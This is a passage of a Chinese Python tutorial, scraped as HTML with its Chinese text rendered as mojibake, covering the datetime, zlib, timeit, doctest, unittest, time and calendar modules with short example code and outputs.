class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="æ—¥æœŸå’Œæ—¶é—´"><a href="#æ—¥æœŸå’Œæ—¶é—´" class="headerlink" title="æ—¥æœŸå’Œæ—¶é—´"></a>æ—¥æœŸå’Œæ—¶é—´</h3><p>datetimeæ¨¡å—ä¸ºæ—¥æœŸå’Œæ—¶é—´å¤„ç†</p><p>è¯¥æ¨¡å—è¿˜æ”¯æŒæ—¶åŒºå¤„ç†</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># dates are easily constructed and formatted</span><span class="token keyword">from</span> datetime <span class="token keyword">import</span> datenow <span class="token operator">=</span> date<span class="token punctuation">.</span>today<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>now<span class="token punctuation">)</span><span class="token comment"># 2021-09-26</span><span class="token keyword">print</span><span class="token punctuation">(</span>now<span class="token punctuation">.</span>strftime<span class="token punctuation">(</span><span class="token string">"%m-%d-%y. %d %b %Y is a %A on the %d day of %B."</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 09-26-21. 26 Sep 2021 is a Sunday on the 26 day of September.</span><span class="token comment"># dates support calendar arithmetic</span>birthday <span class="token operator">=</span> date<span class="token punctuation">(</span><span class="token number">1964</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">)</span>age <span class="token operator">=</span> now <span class="token operator">-</span> birthday<span class="token keyword">print</span><span class="token punctuation">(</span>age<span class="token punctuation">.</span>days<span class="token punctuation">)</span><span class="token comment"># 20876</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="æ•°æ®å‹ç¼©"><a href="#æ•°æ®å‹ç¼©" class="headerlink" title="æ•°æ®å‹ç¼©"></a>æ•°æ®å‹ç¼©</h3><p>ä»¥ä¸‹æ¨¡å—ç›´æ¥æ”¯æŒé€šç”¨çš„æ•°æ®æ‰“åŒ…å’Œå‹ç¼©æ ¼å¼ï¼šzlibï¼Œgzipï¼Œbz2ï¼Œzipfileï¼Œä»¥åŠ tarfile</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> zlibs <span class="token operator">=</span> <span class="token string">b'witch which has which witches wrist watch'</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 41</span>t <span class="token operator">=</span> zlib<span class="token punctuation">.</span>compress<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 37</span><span class="token keyword">print</span><span class="token punctuation">(</span>zlib<span class="token punctuation">.</span>decompress<span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># b'witch which has which witches wrist watch'</span><span class="token keyword">print</span><span class="token punctuation">(</span>zlib<span class="token punctuation">.</span>crc32<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 226805979</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="æ€§èƒ½åº¦é‡"><a href="#æ€§èƒ½åº¦é‡" class="headerlink" title="æ€§èƒ½åº¦é‡"></a>æ€§èƒ½åº¦é‡</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> timeit <span class="token keyword">import</span> Timer<span class="token keyword">print</span><span class="token punctuation">(</span>Timer<span class="token punctuation">(</span><span class="token string">'t=a; a=b; b=t'</span><span class="token punctuation">,</span> <span class="token string">'a=1; b=2'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>timeit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 0.032305799999999996</span><span class="token keyword">print</span><span class="token punctuation">(</span>Timer<span class="token punctuation">(</span><span class="token string">'a,b = b,a'</span><span class="token punctuation">,</span> <span class="token string">'a=1; b=2'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>timeit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 0.025154800000000005</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="æµ‹è¯•æ¨¡å—"><a href="#æµ‹è¯•æ¨¡å—" class="headerlink" title="æµ‹è¯•æ¨¡å—"></a>æµ‹è¯•æ¨¡å—</h3><p>doctestæ¨¡å—æä¾›äº†ä¸€ä¸ªå·¥å…·ï¼Œæ‰«ææ¨¡å—å¹¶æ ¹æ®ç¨‹åºä¸­å†…åµŒçš„æ–‡æ¡£å­—ç¬¦ä¸²æ‰§è¡Œæµ‹è¯•</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">average</span><span class="token punctuation">(</span>values<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Computes the arithmetic mean of a list of numbers.    &gt;&gt;&gt; print(average([20, 30, 70]))    40.0    """</span>    <span class="token keyword">return</span> <span class="token builtin">sum</span><span class="token punctuation">(</span>values<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token builtin">len</span><span class="token punctuation">(</span>values<span class="token punctuation">)</span><span class="token keyword">import</span> doctestdoctest<span class="token punctuation">.</span>testmod<span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token comment"># è‡ªåŠ¨éªŒè¯åµŒå…¥æµ‹è¯•</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>unittestæ¨¡å—ä¸åƒ doctestæ¨¡å—é‚£ä¹ˆå®¹æ˜“ä½¿ç”¨ï¼Œä¸è¿‡å®ƒå¯ä»¥åœ¨ä¸€ä¸ªç‹¬ç«‹çš„æ–‡ä»¶é‡Œæä¾›ä¸€ä¸ªæ›´å…¨é¢çš„æµ‹è¯•é›†</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> unittest<span class="token keyword">class</span> <span class="token class-name">TestStatisticalFunctions</span><span class="token punctuation">(</span>unittest<span class="token punctuation">.</span>TestCase<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">test_average</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>assertEqual<span class="token punctuation">(</span>average<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">70</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">40.0</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>assertEqual<span class="token punctuation">(</span><span class="token builtin">round</span><span class="token punctuation">(</span>average<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">4.3</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>assertRaises<span class="token punctuation">(</span>ZeroDivisionError<span class="token punctuation">,</span> average<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>assertRaises<span class="token punctuation">(</span>TypeError<span class="token punctuation">,</span> average<span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">70</span><span class="token punctuation">)</span>unittest<span class="token punctuation">.</span>main<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># Calling from the command line invokes all tests</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="æ—¶é—´å’Œæ—¥æœŸ"><a href="#æ—¶é—´å’Œæ—¥æœŸ" class="headerlink" title="æ—¶é—´å’Œæ—¥æœŸ"></a>æ—¶é—´å’Œæ—¥æœŸ</h2><ol><li>æ¯ä¸ªæ—¶é—´æˆ³éƒ½ä»¥è‡ªä»1970å¹´1æœˆ1æ—¥åˆå¤œï¼ˆå†å…ƒï¼‰ç»è¿‡äº†å¤šé•¿æ—¶é—´æ¥è¡¨ç¤º</li><li>æ—¶é—´é—´éš”æ˜¯ä»¥ç§’ä¸ºå•ä½çš„æµ®ç‚¹å°æ•°</li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> time  <span class="token comment"># å¼•å…¥timeæ¨¡å—</span>ticks <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"å½“å‰æ—¶é—´æˆ³ä¸º:"</span><span class="token punctuation">,</span> ticks<span class="token punctuation">)</span><span class="token comment"># å½“å‰æ—¶é—´æˆ³ä¸º: 1632676717.5455847</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="æ—¶é—´å…ƒç»„"><a href="#æ—¶é—´å…ƒç»„" class="headerlink" title="æ—¶é—´å…ƒç»„"></a>æ—¶é—´å…ƒç»„</h3><table><thead><tr><th align="left">åºå·</th><th>å­—æ®µ</th><th align="left">å±æ€§</th><th align="left">å€¼</th></tr></thead><tbody><tr><td align="left">0</td><td>4ä½æ•°å¹´</td><td align="left">tm_year</td><td align="left">2008</td></tr><tr><td align="left">1</td><td>æœˆ</td><td align="left">tm_mon</td><td align="left">1 åˆ° 12</td></tr><tr><td align="left">2</td><td>æ—¥</td><td align="left">tm_mday</td><td align="left">1 åˆ° 31</td></tr><tr><td align="left">3</td><td>å°æ—¶</td><td align="left">tm_hour</td><td align="left">0 åˆ° 23</td></tr><tr><td align="left">4</td><td>åˆ†é’Ÿ</td><td align="left">tm_min</td><td align="left">0 åˆ° 59</td></tr><tr><td align="left">5</td><td>ç§’</td><td align="left">tm_sec</td><td align="left">0 åˆ° 61 (60æˆ–61 æ˜¯é—°ç§’)</td></tr><tr><td align="left">6</td><td>ä¸€å‘¨çš„ç¬¬å‡ æ—¥</td><td align="left">tm_wday</td><td align="left">0åˆ°6 (0æ˜¯å‘¨ä¸€)</td></tr><tr><td align="left">7</td><td>ä¸€å¹´çš„ç¬¬å‡ æ—¥</td><td align="left">tm_yday</td><td align="left">1 åˆ° 366(å„’ç•¥å†)</td></tr><tr><td align="left">8</td><td>å¤ä»¤æ—¶</td><td align="left">tm_isdst</td><td align="left">-1, 0, 1, -1æ˜¯å†³å®šæ˜¯å¦ä¸ºå¤ä»¤æ—¶çš„æ——å¸œ</td></tr></tbody></table><h3 id="è·å–å½“å‰æ—¶é—´"><a href="#è·å–å½“å‰æ—¶é—´" class="headerlink" title="è·å–å½“å‰æ—¶é—´"></a>è·å–å½“å‰æ—¶é—´</h3><p>ä»è¿”å›æµ®ç‚¹æ•°çš„æ—¶é—´æˆ³æ–¹å¼å‘æ—¶é—´å…ƒç»„è½¬æ¢ï¼Œåªè¦å°†æµ®ç‚¹æ•°ä¼ é€’ç»™å¦‚localtimeä¹‹ç±»çš„å‡½æ•°</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> timelocaltime <span class="token operator">=</span> time<span class="token punctuation">.</span>localtime<span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"æœ¬åœ°æ—¶é—´ä¸º :"</span><span class="token punctuation">,</span> localtime<span class="token punctuation">)</span><span class="token comment"># æœ¬åœ°æ—¶é—´ä¸º : time.struct_time(tm_year=2021, tm_mon=9, tm_mday=27, tm_hour=1, tm_min=24, tm_sec=5, tm_wday=0, tm_yday=270, tm_isdst=0)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="è·å–æ ¼å¼åŒ–çš„æ—¶é—´"><a href="#è·å–æ ¼å¼åŒ–çš„æ—¶é—´" class="headerlink" title="è·å–æ ¼å¼åŒ–çš„æ—¶é—´"></a>è·å–æ ¼å¼åŒ–çš„æ—¶é—´</h3><p>è·å–å¯è¯»çš„æ—¶é—´æ¨¡å¼çš„å‡½æ•°æ˜¯asctime()</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> timelocaltime <span class="token operator">=</span> time<span class="token punctuation">.</span>asctime<span class="token punctuation">(</span>time<span class="token punctuation">.</span>localtime<span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"æœ¬åœ°æ—¶é—´ä¸º :"</span><span class="token punctuation">,</span> localtime<span class="token punctuation">)</span><span class="token comment"># æœ¬åœ°æ—¶é—´ä¸º : Mon Sep 27 01:25:32 2021</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="æ ¼å¼åŒ–æ—¥æœŸ"><a href="#æ ¼å¼åŒ–æ—¥æœŸ" class="headerlink" title="æ ¼å¼åŒ–æ—¥æœŸ"></a>æ ¼å¼åŒ–æ—¥æœŸ</h3><p>time æ¨¡å—çš„ strftime æ–¹æ³•æ¥æ ¼å¼åŒ–æ—¥æœŸ</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">time<span class="token punctuation">.</span>strftime<span class="token punctuation">(</span><span class="token builtin">format</span><span class="token punctuation">[</span><span class="token punctuation">,</span> t<span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> time<span class="token comment"># æ ¼å¼åŒ–æˆ2016-03-20 11:45:39å½¢å¼</span><span class="token keyword">print</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>strftime<span class="token punctuation">(</span><span class="token string">"%Y-%m-%d %H:%M:%S"</span><span class="token punctuation">,</span> time<span class="token punctuation">.</span>localtime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># æ ¼å¼åŒ–æˆSat Mar 28 22:24:24 2016å½¢å¼</span><span class="token keyword">print</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>strftime<span class="token punctuation">(</span><span class="token string">"%a %b %d %H:%M:%S %Y"</span><span class="token punctuation">,</span> time<span class="token punctuation">.</span>localtime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># å°†æ ¼å¼å­—ç¬¦ä¸²è½¬æ¢ä¸ºæ—¶é—´æˆ³</span>a <span class="token operator">=</span> <span class="token string">"Sat Mar 28 22:24:24 2016"</span><span class="token keyword">print</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>mktime<span class="token punctuation">(</span>time<span class="token punctuation">.</span>strptime<span class="token punctuation">(</span>a<span class="token punctuation">,</span> <span class="token string">"%a %b %d %H:%M:%S %Y"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''2021-09-27 01:28:18Mon Sep 27 01:28:18 20211459175064.0'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>pythonä¸­æ—¶é—´æ—¥æœŸæ ¼å¼åŒ–ç¬¦å·</p><ul><li>%y ä¸¤ä½æ•°çš„å¹´ä»½è¡¨ç¤ºï¼ˆ00-99ï¼‰</li><li>%Y å››ä½æ•°çš„å¹´ä»½è¡¨ç¤ºï¼ˆ000-9999ï¼‰</li><li>%m æœˆä»½ï¼ˆ01-12ï¼‰</li><li>%d æœˆå†…ä¸­çš„ä¸€å¤©ï¼ˆ0-31ï¼‰</li><li>%H 24å°æ—¶åˆ¶å°æ—¶æ•°ï¼ˆ0-23ï¼‰</li><li>%I 12å°æ—¶åˆ¶å°æ—¶æ•°ï¼ˆ01-12ï¼‰</li><li>%M åˆ†é’Ÿæ•°ï¼ˆ00-59ï¼‰</li><li>%S ç§’ï¼ˆ00-59ï¼‰</li><li>%a æœ¬åœ°ç®€åŒ–æ˜ŸæœŸåç§°</li><li>%A æœ¬åœ°å®Œæ•´æ˜ŸæœŸåç§°</li><li>%b æœ¬åœ°ç®€åŒ–çš„æœˆä»½åç§°</li><li>%B æœ¬åœ°å®Œæ•´çš„æœˆä»½åç§°</li><li>%c æœ¬åœ°ç›¸åº”çš„æ—¥æœŸè¡¨ç¤ºå’Œæ—¶é—´è¡¨ç¤º</li><li>%j å¹´å†…çš„ä¸€å¤©ï¼ˆ001-366ï¼‰</li><li>%p æœ¬åœ°A.M.æˆ–P.M.çš„ç­‰ä»·ç¬¦</li><li>%U ä¸€å¹´ä¸­çš„æ˜ŸæœŸæ•°ï¼ˆ00-53ï¼‰æ˜ŸæœŸå¤©ä¸ºæ˜ŸæœŸçš„å¼€å§‹</li><li>%w æ˜ŸæœŸï¼ˆ0-6ï¼‰ï¼Œæ˜ŸæœŸå¤©ä¸ºæ˜ŸæœŸçš„å¼€å§‹</li><li>%W ä¸€å¹´ä¸­çš„æ˜ŸæœŸæ•°ï¼ˆ00-53ï¼‰æ˜ŸæœŸä¸€ä¸ºæ˜ŸæœŸçš„å¼€å§‹</li><li>%x æœ¬åœ°ç›¸åº”çš„æ—¥æœŸè¡¨ç¤º</li><li>%X æœ¬åœ°ç›¸åº”çš„æ—¶é—´è¡¨ç¤º</li><li>%Z å½“å‰æ—¶åŒºçš„åç§°</li><li>%% %å·æœ¬èº«</li></ul><h3 id="è·å–æŸæœˆæ—¥å†"><a href="#è·å–æŸæœˆæ—¥å†" class="headerlink" title="è·å–æŸæœˆæ—¥å†"></a>è·å–æŸæœˆæ—¥å†</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> calendarcal <span class="token operator">=</span> calendar<span class="token punctuation">.</span>month<span class="token punctuation">(</span><span class="token number">2016</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"ä»¥ä¸‹è¾“å‡º2016å¹´1æœˆä»½çš„æ—¥å†:"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>cal<span class="token punctuation">)</span><span class="token triple-quoted-string string">'''ä»¥ä¸‹è¾“å‡º2016å¹´1æœˆä»½çš„æ—¥å†:    January 2016Mo Tu We Th Fr Sa Su             1  2  3 4  5  6  7  8  9 1011 12 13 14 15 16 1718 19 20 21 22 23 2425 26 27 28 29 30 31'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Time-æ¨¡å—"><a href="#Time-æ¨¡å—" class="headerlink" title="Time æ¨¡å—"></a>Time æ¨¡å—</h3><p>Time æ¨¡å—åŒ…å«äº†ä»¥ä¸‹å†…ç½®å‡½æ•°ï¼Œæ—¢æœ‰æ—¶é—´å¤„ç†çš„ï¼Œä¹Ÿæœ‰è½¬æ¢æ—¶é—´æ ¼å¼çš„</p><table><thead><tr><th align="left">åºå·</th><th align="left">å‡½æ•°åŠæè¿°</th></tr></thead><tbody><tr><td align="left">1</td><td align="left"><a href="https://www.runoob.com/python/att-time-altzone.html">time.altzone</a> è¿”å›æ ¼æ—å¨æ²»è¥¿éƒ¨çš„å¤ä»¤æ—¶åœ°åŒºçš„åç§»ç§’æ•°ã€‚å¦‚æœè¯¥åœ°åŒºåœ¨æ ¼æ—å¨æ²»ä¸œéƒ¨ä¼šè¿”å›è´Ÿå€¼ï¼ˆå¦‚è¥¿æ¬§ï¼ŒåŒ…æ‹¬è‹±å›½ï¼‰ã€‚å¯¹å¤ä»¤æ—¶å¯ç”¨åœ°åŒºæ‰èƒ½ä½¿ç”¨ã€‚</td></tr><tr><td align="left">2</td><td align="left">[time.asctime(<a href="https://www.runoob.com/python/att-time-asctime.html">tupletime])</a> æ¥å—æ—¶é—´å…ƒç»„å¹¶è¿”å›ä¸€ä¸ªå¯è¯»çš„å½¢å¼ä¸ºâ€Tue Dec 11 18:07:14 2008â€ï¼ˆ2008å¹´12æœˆ11æ—¥ å‘¨äºŒ18æ—¶07åˆ†14ç§’ï¼‰çš„24ä¸ªå­—ç¬¦çš„å­—ç¬¦ä¸²ã€‚</td></tr><tr><td align="left">3</td><td align="left"><a href="https://www.runoob.com/python/att-time-clock.html">time.clock( )</a> ç”¨ä»¥æµ®ç‚¹æ•°è®¡ç®—çš„ç§’æ•°è¿”å›å½“å‰çš„CPUæ—¶é—´ã€‚ç”¨æ¥è¡¡é‡ä¸åŒç¨‹åºçš„è€—æ—¶ï¼Œæ¯”time.time()æ›´æœ‰ç”¨ã€‚</td></tr><tr><td align="left">4</td><td align="left">[time.ctime(<a href="https://www.runoob.com/python/att-time-ctime.html">secs])</a> ä½œç”¨ç›¸å½“äºasctime(localtime(secs))ï¼Œæœªç»™å‚æ•°ç›¸å½“äºasctime()</td></tr><tr><td align="left">5</td><td align="left">[time.gmtime(<a href="https://www.runoob.com/python/att-time-gmtime.html">secs])</a> æ¥æ”¶æ—¶é—´æˆ³ï¼ˆ1970çºªå…ƒåç»è¿‡çš„æµ®ç‚¹ç§’æ•°ï¼‰å¹¶è¿”å›æ ¼æ—å¨æ²»å¤©æ–‡æ—¶é—´ä¸‹çš„æ—¶é—´å…ƒç»„tã€‚æ³¨ï¼št.tm_isdstå§‹ç»ˆä¸º0</td></tr><tr><td align="left">6</td><td align="left">[time.localtime(<a href="https://www.runoob.com/python/att-time-localtime.html">secs])</a> æ¥æ”¶æ—¶é—´æˆ³ï¼ˆ1970çºªå…ƒåç»è¿‡çš„æµ®ç‚¹ç§’æ•°ï¼‰å¹¶è¿”å›å½“åœ°æ—¶é—´ä¸‹çš„æ—¶é—´å…ƒç»„tï¼ˆt.tm_isdstå¯å–0æˆ–1ï¼Œå–å†³äºå½“åœ°å½“æ—¶æ˜¯ä¸æ˜¯å¤ä»¤æ—¶ï¼‰ã€‚</td></tr><tr><td align="left">7</td><td align="left"><a href="https://www.runoob.com/python/att-time-mktime.html">time.mktime(tupletime)</a> æ¥å—æ—¶é—´å…ƒç»„å¹¶è¿”å›æ—¶é—´æˆ³ï¼ˆ1970çºªå…ƒåç»è¿‡çš„æµ®ç‚¹ç§’æ•°ï¼‰ã€‚</td></tr><tr><td align="left">8</td><td align="left"><a href="https://www.runoob.com/python/att-time-sleep.html">time.sleep(secs)</a> æ¨è¿Ÿè°ƒç”¨çº¿ç¨‹çš„è¿è¡Œï¼ŒsecsæŒ‡ç§’æ•°ã€‚</td></tr><tr><td align="left">9</td><td align="left">[time.strftime(fmt<a href="https://www.runoob.com/python/att-time-strftime.html">,tupletime])</a> æ¥æ”¶ä»¥æ—¶é—´å…ƒç»„ï¼Œå¹¶è¿”å›ä»¥å¯è¯»å­—ç¬¦ä¸²è¡¨ç¤ºçš„å½“åœ°æ—¶é—´ï¼Œæ ¼å¼ç”±fmtå†³å®šã€‚</td></tr><tr><td align="left">10</td><td align="left"><a href="https://www.runoob.com/python/att-time-strptime.html">time.strptime(str,fmt=â€™%a %b %d %H:%M:%S %Yâ€™)</a> æ ¹æ®fmtçš„æ ¼å¼æŠŠä¸€ä¸ªæ—¶é—´å­—ç¬¦ä¸²è§£æä¸ºæ—¶é—´å…ƒç»„ã€‚</td></tr><tr><td align="left">11</td><td align="left"><a href="https://www.runoob.com/python/att-time-time.html">time.time( )</a> è¿”å›å½“å‰æ—¶é—´çš„æ—¶é—´æˆ³ï¼ˆ1970çºªå…ƒåç»è¿‡çš„æµ®ç‚¹ç§’æ•°ï¼‰ã€‚</td></tr><tr><td align="left">12</td><td align="left"><a href="https://www.runoob.com/python/att-time-tzset.html">time.tzset()</a> æ ¹æ®ç¯å¢ƒå˜é‡TZé‡æ–°åˆå§‹åŒ–æ—¶é—´ç›¸å…³è®¾ç½®ã€‚</td></tr></tbody></table><p>Timeæ¨¡å—åŒ…å«äº†ä»¥ä¸‹2ä¸ªéå¸¸é‡è¦çš„å±æ€§ï¼š</p><table><thead><tr><th align="left">åºå·</th><th align="left">å±æ€§åŠæè¿°</th></tr></thead><tbody><tr><td align="left">1</td><td align="left"><strong>time.timezone</strong> å±æ€§ time.timezone æ˜¯å½“åœ°æ—¶åŒºï¼ˆæœªå¯åŠ¨å¤ä»¤æ—¶ï¼‰è·ç¦»æ ¼æ—å¨æ²»çš„åç§»ç§’æ•°ï¼ˆ&gt;0ï¼Œç¾æ´²&lt;=0å¤§éƒ¨åˆ†æ¬§æ´²ï¼Œäºšæ´²ï¼Œéæ´²ï¼‰ã€‚</td></tr><tr><td align="left">2</td><td align="left"><strong>time.tzname</strong> å±æ€§time.tznameåŒ…å«ä¸€å¯¹æ ¹æ®æƒ…å†µçš„ä¸åŒè€Œä¸åŒçš„å­—ç¬¦ä¸²ï¼Œåˆ†åˆ«æ˜¯å¸¦å¤ä»¤æ—¶çš„æœ¬åœ°æ—¶åŒºåç§°ï¼Œå’Œä¸å¸¦çš„ã€‚</td></tr></tbody></table><h3 id="æ—¥å†ï¼ˆCalendarï¼‰æ¨¡å—"><a href="#æ—¥å†ï¼ˆCalendarï¼‰æ¨¡å—" class="headerlink" title="æ—¥å†ï¼ˆCalendarï¼‰æ¨¡å—"></a>æ—¥å†ï¼ˆCalendarï¼‰æ¨¡å—</h3><p>æ­¤æ¨¡å—çš„å‡½æ•°éƒ½æ˜¯æ—¥å†ç›¸å…³çš„ï¼Œä¾‹å¦‚æ‰“å°æŸæœˆçš„å­—ç¬¦æœˆå†ã€‚</p><p>æ˜ŸæœŸä¸€æ˜¯é»˜è®¤çš„æ¯å‘¨ç¬¬ä¸€å¤©ï¼Œæ˜ŸæœŸå¤©æ˜¯é»˜è®¤çš„æœ€åä¸€å¤©ã€‚æ›´æ”¹è®¾ç½®éœ€è°ƒç”¨calendar.setfirstweekday()å‡½æ•°ã€‚æ¨¡å—åŒ…å«äº†ä»¥ä¸‹å†…ç½®å‡½æ•°</p><table><thead><tr><th align="left">åºå·</th><th align="left">å‡½æ•°åŠæè¿°</th></tr></thead><tbody><tr><td align="left">1</td><td align="left"><strong>calendar.calendar(year,w=2,l=1,c=6)</strong> è¿”å›ä¸€ä¸ªå¤šè¡Œå­—ç¬¦ä¸²æ ¼å¼çš„yearå¹´å¹´å†ï¼Œ3ä¸ªæœˆä¸€è¡Œï¼Œé—´éš”è·ç¦»ä¸ºcã€‚ æ¯æ—¥å®½åº¦é—´éš”ä¸ºwå­—ç¬¦ã€‚æ¯è¡Œé•¿åº¦ä¸º21* W+18+2* Cã€‚læ˜¯æ¯æ˜ŸæœŸè¡Œæ•°ã€‚</td></tr><tr><td align="left">2</td><td align="left"><strong>calendar.firstweekday( )</strong> è¿”å›å½“å‰æ¯å‘¨èµ·å§‹æ—¥æœŸçš„è®¾ç½®ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œé¦–æ¬¡è½½å…¥ calendar æ¨¡å—æ—¶è¿”å› 0ï¼Œå³æ˜ŸæœŸä¸€ã€‚</td></tr><tr><td align="left">3</td><td align="left"><strong>calendar.isleap(year)</strong> æ˜¯é—°å¹´è¿”å› Trueï¼Œå¦åˆ™ä¸º Falseã€‚<code>&gt;&gt;&gt; import calendar &gt;&gt;&gt; print(calendar.isleap(2000)) True &gt;&gt;&gt; print(calendar.isleap(1900)) False</code></td></tr><tr><td align="left">4</td><td align="left"><strong>calendar.leapdays(y1,y2)</strong> è¿”å›åœ¨Y1ï¼ŒY2ä¸¤å¹´ä¹‹é—´çš„é—°å¹´æ€»æ•°ã€‚</td></tr><tr><td align="left">5</td><td align="left"><strong>calendar.month(year,month,w=2,l=1)</strong> è¿”å›ä¸€ä¸ªå¤šè¡Œå­—ç¬¦ä¸²æ ¼å¼çš„yearå¹´monthæœˆæ—¥å†ï¼Œä¸¤è¡Œæ ‡é¢˜ï¼Œä¸€å‘¨ä¸€è¡Œã€‚æ¯æ—¥å®½åº¦é—´éš”ä¸ºwå­—ç¬¦ã€‚æ¯è¡Œçš„é•¿åº¦ä¸º7* w+6ã€‚læ˜¯æ¯æ˜ŸæœŸçš„è¡Œæ•°ã€‚</td></tr><tr><td align="left">6</td><td align="left"><strong>calendar.monthcalendar(year,month)</strong> 